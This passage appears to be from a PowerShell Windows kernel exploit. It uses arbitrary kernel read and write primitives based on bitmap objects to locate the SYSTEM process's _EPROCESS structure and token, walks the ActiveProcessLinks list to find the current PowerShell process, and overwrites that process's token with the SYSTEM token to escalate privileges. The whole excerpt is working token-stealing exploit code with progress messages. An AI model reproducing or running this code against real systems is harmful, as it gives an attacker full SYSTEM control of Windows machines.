$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
echo "[+] SYSTEM _EPORCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
 
# Get EPROCESS entry for current process
echo "`n[>] Leaking current _EPROCESS.."
echo "[+] Traversing ActiveProcessLinks list"
$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
while($true) {
    $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
    if ($NextPID -eq $PID) {
        echo "[+] PowerShell _EPORCESS address: 0x$("{0:X}" -f $NextProcess)"
        echo "[+] PID: $NextPID"
        echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
        $PoShTokenAddr = $NextProcess+$TokenOffset
        break
    }
    $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
}
 
# Duplicate token!
echo "`n[!] Duplicating SYSTEM token!`n"
Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
 
#==============================================[/Duplicate SYSTEM token]